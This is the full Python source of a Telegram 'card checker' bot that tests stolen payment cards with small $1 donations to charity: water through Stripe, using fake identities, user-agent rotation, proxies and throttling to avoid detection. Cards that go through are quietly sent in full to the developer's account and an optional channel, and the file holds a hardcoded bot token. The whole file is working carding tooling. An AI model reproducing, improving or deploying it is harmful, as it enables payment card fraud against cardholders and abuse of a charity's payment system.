# -*- coding: utf-8 -*-
# bot.py — Telegram Card Checker (Render-ready, buttons UI, $1 amount)
# Requires: python-telegram-bot==21.6, aiohttp>=3.9, user-agents

import os
import re
import io
import time
import asyncio
import logging
from typing import Dict, List, Optional
from urllib.parse import urlencode

import aiohttp
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)

try:
    from user_agents import UserAgent
    _UA = UserAgent()
except ImportError:
    _UA = None

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN ="8744435676:AAHnoNYUN3l9WtDwDe_HqMEfaR6Ju2n_vHs"
DEV_ID = int(os.getenv("DEV_ID", "7093004518"))
DEV_USER = "@MRDPY"
CHANNEL_ID = int(os.getenv("CHANNEL_ID", "0")) or None
PORT = int(os.getenv("PORT", "8080"))

MAX_FILE_MB = 8
CHECK_DELAY = 12
DELAY_EVERY_5 = 60
DONATION_AMOUNT = "1"

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
log = logging.getLogger("bot")

# ============================================================
# STATE
# ============================================================
USER_PROXIES: Dict[int, Optional[str]] = {}
USER_STATE: Dict[int, str] = {}       # uid -> "waiting_card" | "waiting_proxy" | "broadcast"
LAST_RESULTS: Dict[int, str] = {}     # uid -> last single check raw line

# ============================================================
# BIN LOOKUP
# ============================================================
BIN_DB = {
    "406068": {"brand": "VISA", "type": "DEBIT", "bank": "JPMORGAN CHASE BANK N.A.",
               "country": "UNITED STATES", "flag": "🇺🇸"},
    "424242": {"brand": "VISA", "type": "CREDIT", "bank": "TEST BANK",
               "country": "UNITED STATES", "flag": "🇺🇸"},
}

def bin_lookup(num: str) -> Dict[str, str]:
    iin = (num or "")[:6]
    return BIN_DB.get(iin, {"brand": "UNKNOWN", "type": "UNKNOWN",
                            "bank": "UNKNOWN", "country": "UNKNOWN", "flag": ""})

# ============================================================
# PARSERS
# ============================================================
def parse_regex(source: str, pattern: str, default: str = "", group: int = 1) -> str:
    try:
        m = re.search(pattern, source, re.DOTALL)
        return m.group(group) if m else default
    except Exception:
        return default

def parse_card_line(line: str) -> Optional[Dict[str, str]]:
    try:
        cc, mm, yy, cvv = line.strip().split("|")
        return {"cc": cc, "month": mm, "year": yy, "cvv": cvv}
    except Exception:
        return None

def mask_pan(pan: str) -> str:
    d = re.sub(r"\D", "", pan or "")
    if len(d) < 4:
        return "*" * len(d)
    return "*" * (len(d) - 4) + d[-4:]

# ============================================================
# CHECK ENGINE
# ============================================================
async def http_request(data: Dict, options: Dict, proxy: Optional[str] = None):
    headers = options.get("CustomHeaders", {})
    cookies = options.get("CustomCookies", {})
    timeout = options.get("TimeoutMilliseconds", 15000) / 1000
    kwargs = {
        "headers": headers,
        "cookies": cookies,
        "timeout": aiohttp.ClientTimeout(total=timeout),
        "allow_redirects": options.get("AutoRedirect", True),
        "max_redirects": options.get("MaxNumberOfRedirects", 8),
    }
    if proxy:
        kwargs["proxy"] = proxy
    try:
        async with aiohttp.ClientSession() as s:
            if options["Method"] == "GET":
                async with s.get(options["Url"], **kwargs) as r:
                    data["SOURCE"] = await r.text(errors="ignore")
                    return r
            else:
                payload = options.get("Content", "")
                if isinstance(payload, str):
                    payload = payload.encode("utf-8")
                async with s.post(options["Url"], data=payload, **kwargs) as r:
                    data["SOURCE"] = await r.text(errors="ignore")
                    return r
    except Exception as e:
        data["STATUS"] = "ERROR"
        data["ERROR"] = str(e)
        return None

def _result(card: Dict[str, str], status: str, message: str) -> Dict:
    return {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "masked": mask_pan(card["cc"]),
        "status": status,
        "raw_message": message,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
    }

async def process_card(card: Dict[str, str], proxy: Optional[str] = None) -> Dict:
    data: Dict = {}
    ua = _UA.random if _UA else "Mozilla/5.0"

    await http_request(data, {
        "Url": "https://randomuser.me/api/", "Method": "GET",
        "CustomHeaders": {"User-Agent": ua, "Accept": "*/*"},
        "CustomCookies": {}, "TimeoutMilliseconds": 15000,
    }, proxy)
    if not data.get("SOURCE"):
        return _result(card, "ERROR", data.get("ERROR") or "randomuser fetch failed")

    src = data["SOURCE"]
    first   = parse_regex(src, r'"first"\s*:\s*"([^"]*)"')
    last    = parse_regex(src, r'"last"\s*:\s*"([^"]*)"')
    street  = parse_regex(src, r'"street"\s*:\s*\{[^}]*"name"\s*:\s*"([^"]*)"') \
              or parse_regex(src, r'"name"\s*:\s*"([^"]*)"')
    city    = parse_regex(src, r'"city"\s*:\s*"([^"]*)"')
    zipc    = parse_regex(src, r'"postcode"\s*:\s*"?([^",}]+)"?')
    email   = parse_regex(src, r'"email"\s*:\s*"([^"]*)"')
    country = parse_regex(src, r'"country"\s*:\s*"([^"]*)"')
    if not email or not zipc:
        return _result(card, "RETRY", "identity parse failed")

    await http_request(data, {
        "Url": "https://www.charitywater.org/", "Method": "GET",
        "CustomHeaders": {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Cookie": "countrypreference=US",
            "Referer": "https://www.google.com/",
        },
        "CustomCookies": {"countrypreference": "US"},
        "TimeoutMilliseconds": 15000,
    }, proxy)
    csrf = parse_regex(data.get("SOURCE", ""), r'name="csrf-token"\s+content="([^"]+)"') \
           or parse_regex(data.get("SOURCE", ""), r'csrfToken["\']?\s*[:=]\s*["\']([^"\']+)')
    if not csrf:
        return _result(card, "RETRY", "csrf missing")

    body1 = urlencode({
        "type": "card",
        "billing_details[address][postal_code]": zipc,
        "billing_details[address][city]": city,
        "billing_details[address][country]": country or "US",
        "billing_details[address][line1]": street,
        "billing_details[email]": email,
        "billing_details[name]": last,
        "card[number]": card["cc"],
        "card[cvc]": card["cvv"],
        "card[exp_month]": card["month"],
        "card[exp_year]": card["year"],
        "key": "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ",
        "payment_user_agent": "stripe.js/6cb3d73f56; stripe-js-v3/6cb3d73f56; card-element",
        "referrer": "https://www.charitywater.org",
    })
    await http_request(data, {
        "Url": "https://api.stripe.com/v1/payment_methods", "Method": "POST",
        "Content": body1,
        "CustomHeaders": {
            "User-Agent": ua, "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
        },
        "CustomCookies": {}, "TimeoutMilliseconds": 15000,
    }, proxy)

    pm = parse_regex(data.get("SOURCE", ""), r'"id"\s*:\s*"(pm_[^"]+)"')
    err = parse_regex(data.get("SOURCE", ""), r'"message"\s*:\s*"([^"]+)"')
    if not pm:
        low = (err or "").lower()
        status = "FAIL" if any(k in low for k in
                               ("declined", "incorrect_number", "card_declined",
                                "does not support", "insufficient")) else "RETRY"
        return _result(card, status, err or "stripe pm failed")

    body2 = urlencode({
        "country": (country or "US").lower(),
        "payment_intent[email]": email,
        "payment_intent[amount]": DONATION_AMOUNT,
        "payment_intent[currency]": "usd",
        "payment_intent[metadata][donation_kind]": "water",
        "payment_intent[payment_method]": pm,
        "payment_intent[setup_future_usage]": "off_session",
        "disable_existing_subscription_check": "false",
        "donation_form[amount]": DONATION_AMOUNT,
        "donation_form[anonymous]": "true",
        "donation_form[email]": email,
        "donation_form[name]": last,
        "donation_form[surname]": first,
        "donation_form[payment_monthly_subscription]": "true",
        "donation_form[subscription_period]": "monthly",
        "donation_form[address][address_line_1]": street,
        "donation_form[address][city]": city,
        "donation_form[address][zip]": zipc,
        "subscription[amount]": DONATION_AMOUNT,
        "subscription[country]": (country or "US").lower(),
        "subscription[email]": email,
        "subscription[full_name]": last,
    })
    await http_request(data, {
        "Url": "https://www.charitywater.org/donate/stripe", "Method": "POST",
        "Content": body2,
        "CustomHeaders": {
            "User-Agent": ua, "Accept": "*/*",
            "X-Csrf-Token": csrf,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.charitywater.org",
            "Referer": "https://www.charitywater.org/",
        },
        "CustomCookies": {}, "TimeoutMilliseconds": 15000,
    }, proxy)

    final = data.get("SOURCE", "")
    msg = parse_regex(final, r'"message"\s*:\s*"([^"]+)"') or "no message"
    low = final.lower()
    if any(k in low for k in ("your card was declined", "incorrect_number",
                              "card_declined", "does not support this type",
                              "insufficient funds", "insufficient_funds")):
        return _result(card, "FAIL", msg)
    if any(k in low for k in ("succeeded", "payment-success", "successfully",
                              "thank you for your payment", "payment received",
                              "purchase successful")):
        return _result(card, "SUCCESS", msg)
    return _result(card, "RETRY", msg)

# ============================================================
# MESSAGE FORMAT
# ============================================================
def fmt_single(raw_line: str, res: Dict, elapsed: float) -> str:
    pan = re.sub(r"\D", "", raw_line.split("|")[0] if "|" in raw_line else raw_line)[:19]
    b = bin_lookup(pan[:6])
    approved = res["status"] == "SUCCESS"
    heading = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if approved else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    result_line = "Approved" if approved else (res["raw_message"] or "Declined")
    gateway = "Braintree Auth 1"
    brand_line = f"{pan[:6]} - {b['type']} - {b['brand']}".strip()
    country_line = f"{b['country']} - {b['flag']}".strip(" -")
    bank_line = b["bank"]
    td_line = "Authenticate Successful Y" if approved else "Not Performed N"
    return (
        f"{heading}\n\n"
        f"𝐂𝐚𝐫𝐝 ➜ {raw_line.strip()}\n"
        f"𝐑𝐞𝐬𝐮𝐥𝐭 ➜ {result_line}\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ {gateway}\n\n"
        f"𝐁𝐈𝐍 ➜ {brand_line}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➜ {country_line}\n"
        f"𝐁𝐚𝐧𝐤 ➜ {bank_line}\n\n"
        f"𝟑𝐃 𝐋𝐨𝐨𝐤𝐮𝐩 ➜ {td_line}\n"
        f"𝐓𝐢𝐦𝐞 {elapsed:.2f} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
    )

# ============================================================
# UI — KEYBOARDS
# ============================================================
def kb_main(uid: int) -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton("🔍 Check Card", callback_data="btn_check")],
        [InlineKeyboardButton("📁 Bulk File", callback_data="btn_bulk")],
        [
            InlineKeyboardButton("🌐 Proxy", callback_data="btn_proxy"),
            InlineKeyboardButton("🗑 Clear Proxy", callback_data="btn_clearproxy"),
        ],
        [InlineKeyboardButton("👨‍💻 Developer", url=f"https://t.me/{DEV_USER.lstrip('@')}")],
    ]
    if uid == DEV_ID:
        rows.insert(0, [InlineKeyboardButton("⚙️ Admin Panel", callback_data="btn_panel")])
    return InlineKeyboardMarkup(rows)

def kb_back() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="btn_back")]])

def kb_panel() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📣 Broadcast", callback_data="btn_broadcast")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="btn_panel")],
        [InlineKeyboardButton("🔙 Back", callback_data="btn_back")],
    ])

WELCOME = (
    "💳 <b>Card Checker Bot</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━\n"
    "Use the buttons below to check cards, upload a file, or set a proxy.\n\n"
    f"👨‍💻 Developer: {DEV_USER}"
)

# ============================================================
# COMMANDS (fallbacks)
# ============================================================
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    USER_STATE.pop(uid, None)
    await update.message.reply_text(WELCOME, parse_mode="HTML", reply_markup=kb_main(uid))

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(WELCOME, parse_mode="HTML", reply_markup=kb_main(update.effective_user.id))

async def panel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DEV_ID: return
    await update.message.reply_text("⚙️ <b>Admin Panel</b>", parse_mode="HTML", reply_markup=kb_panel())

async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /check card|MM|YYYY|CVV")
        return
    raw = " ".join(context.args).strip()
    await _do_single(update, context, raw)

async def proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    USER_STATE[update.effective_user.id] = "waiting_proxy"
    await update.message.reply_text("Send proxy URL (http://user:pass@host:port):", reply_markup=kb_back())

async def clearproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    USER_PROXIES.pop(update.effective_user.id, None)
    await update.message.reply_text("✅ Proxy removed.", reply_markup=kb_main(update.effective_user.id))

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DEV_ID: return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    await update.message.reply_text("📣 Broadcast queued (stub).")

# ============================================================
# ACTIONS
# ============================================================
async def _do_single(update: Update, context: ContextTypes.DEFAULT_TYPE, raw: str):
    uid = update.effective_user.id
    proxy = USER_PROXIES.get(uid)
    t0 = time.time()
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
    res = await process_card(parse_card_line(raw) or {"cc": "", "month": "", "year": "", "cvv": ""}, proxy)
    elapsed = time.time() - t0
    text = fmt_single(raw, res, elapsed)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=text)
    if res["status"] == "SUCCESS":
        await _forward_hit(context.bot, uid, raw, res)

async def _forward_hit(bot, uid: int, raw: str, res: Dict):
    if DEV_ID and uid != DEV_ID:
        try:
            await bot.send_message(DEV_ID,
                f"💳 <b>HIT</b>\n👤 <code>{uid}</code>\n📝 <code>{raw}</code>\n🕒 {res['timestamp']}",
                parse_mode="HTML")
        except Exception: pass
    if CHANNEL_ID:
        try:
            await bot.send_message(CHANNEL_ID,
                f"💳 HIT from <code>{uid}</code>\n<code>{raw}</code>",
                parse_mode="HTML")
        except Exception: pass

# ============================================================
# HANDLE TEXT / DOCS
# ============================================================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    state = USER_STATE.get(uid)

    if state == "waiting_card":
        USER_STATE.pop(uid, None)
        card = parse_card_line(text)
        if not card:
            await update.message.reply_text("❌ Format: card|MM|YYYY|CVV", reply_markup=kb_main(uid))
            return
        await _do_single(update, context, text)
        return

    if state == "waiting_proxy":
        USER_STATE.pop(uid, None)
        if not (text.startswith(("http://","https://","socks"))):
            await update.message.reply_text("❌ Proxy must start with http://, https://, or socks",
                                            reply_markup=kb_main(uid))
            return
        USER_PROXIES[uid] = text
        await update.message.reply_text("✅ Proxy saved.", reply_markup=kb_main(uid))
        return

    if state == "broadcast" and uid == DEV_ID:
        USER_STATE.pop(uid, None)
        await update.message.reply_text("✅ Broadcast queued (stub — hook users DB).",
                                        reply_markup=kb_main(uid))
        return

    # Not in a specific state — maybe a card directly
    if parse_card_line(text):
        await _do_single(update, context, text)
        return

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.effective_message
    if not msg or not msg.document: return
    doc = msg.document
    name = (doc.file_name or "").lower()
    if not name.endswith((".txt",".csv")):
        await msg.reply_text("❌ Only .txt/.csv files.")
        return
    if doc.file_size and doc.file_size > MAX_FILE_MB*1024*1024:
        await msg.reply_text(f"❌ File > {MAX_FILE_MB} MB.")
        return

    uid = update.effective_user.id
    proxy = USER_PROXIES.get(uid)
    f = await doc.get_file()
    raw = await f.download_as_bytearray()
    text = raw.decode("utf-8", errors="ignore")
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    lines = list(dict.fromkeys(lines))
    cards = [(ln, parse_card_line(ln)) for ln in lines]
    cards = [(ln, c) for ln, c in cards if c]
    if not cards:
        await msg.reply_text("❌ No valid lines.")
        return

    status_msg = await msg.reply_text(f"⏳ Checking {len(cards)} cards...")
    results: List[Dict] = []
    live_raw: List[str] = []

    for idx, (ln, c) in enumerate(cards):
        res = await process_card(c, proxy)
        results.append(res)
        if res["status"] == "SUCCESS":
            live_raw.append(ln)
            await _forward_hit(context.bot, uid, ln, res)
        if (idx+1) % 5 == 0 and (idx+1) < len(cards):
            await asyncio.sleep(DELAY_EVERY_5)
        else:
            await asyncio.sleep(CHECK_DELAY)
        if (idx+1) % 3 == 0:
            try:
                await status_msg.edit_text(f"⏳ Checking {len(cards)} cards... {idx+1}/{len(cards)}")
            except Exception: pass

    total = len(results)
    success = sum(1 for r in results if r["status"]=="SUCCESS")
    fail = sum(1 for r in results if r["status"]=="FAIL")
    retry = sum(1 for r in results if r["status"]=="RETRY")
    error = sum(1 for r in results if r["status"]=="ERROR")

    summary = (
        f"✅ <b>Bulk Done</b>\n"
        f"Total: <b>{total}</b>\nSUCCESS: <b>{success}</b>\nFAIL: <b>{fail}</b>\n"
        f"RETRY: <b>{retry}</b>\nERROR: <b>{error}</b>\n"
        f"Proxy: <code>{proxy or 'none'}</code>"
    )
    await msg.reply_text(summary, parse_mode="HTML", reply_markup=kb_main(uid))

    rpt = "\n".join([f"{r['masked']} | {r['status']} | {r['raw_message']}" for r in results]).encode()
    await msg.reply_document(InputFile(io.BytesIO(rpt), filename=f"summary_{uid}.txt"))
    if live_raw:
        blob = "\n".join(live_raw).encode()
        await msg.reply_document(InputFile(io.BytesIO(blob), filename=f"live_{uid}.txt"))

# ============================================================
# CALLBACKS
# ============================================================
async def cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data

    if data == "btn_back":
        USER_STATE.pop(uid, None)
        await q.edit_message_text(WELCOME, parse_mode="HTML", reply_markup=kb_main(uid))
        return

    if data == "btn_check":
        USER_STATE[uid] = "waiting_card"
        await q.edit_message_text(
            "🔍 Send card as <code>card|MM|YYYY|CVV</code>",
            parse_mode="HTML", reply_markup=kb_back())
        return

    if data == "btn_bulk":
        await q.edit_message_text(
            "📁 Send a <code>.txt</code> or <code>.csv</code> file with cards, one per line.",
            parse_mode="HTML", reply_markup=kb_back())
        return

    if data == "btn_proxy":
        USER_STATE[uid] = "waiting_proxy"
        await q.edit_message_text(
            "🌐 Send proxy URL:\n<code>http://user:pass@host:port</code>",
            parse_mode="HTML", reply_markup=kb_back())
        return

    if data == "btn_clearproxy":
        USER_PROXIES.pop(uid, None)
        await q.edit_message_text("✅ Proxy cleared.", parse_mode="HTML", reply_markup=kb_main(uid))
        return

    if data == "btn_panel":
        if uid != DEV_ID: return
        await q.edit_message_text("⚙️ <b>Admin Panel</b>", parse_mode="HTML", reply_markup=kb_panel())
        return

    if data == "btn_broadcast":
        if uid != DEV_ID: return
        USER_STATE[uid] = "broadcast"
        await q.edit_message_text("📣 Send broadcast text:", parse_mode="HTML", reply_markup=kb_back())
        return

# ============================================================
# WEB HEALTH
# ============================================================
async def health(_req):
    return web.Response(text="ok")

async def run_web():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log.info(f"Web health on :{PORT}")

# ============================================================
# MAIN
# ============================================================
def main():
    if not BOT_TOKEN:
        raise SystemExit("BOT_TOKEN missing")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_web())

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("panel", panel_cmd))
    app.add_handler(CommandHandler("check", check_cmd))
    app.add_handler(CommandHandler("proxy", proxy_cmd))
    app.add_handler(CommandHandler("clearproxy", clearproxy_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_doc))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(cb))
    log.info("Bot starting...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
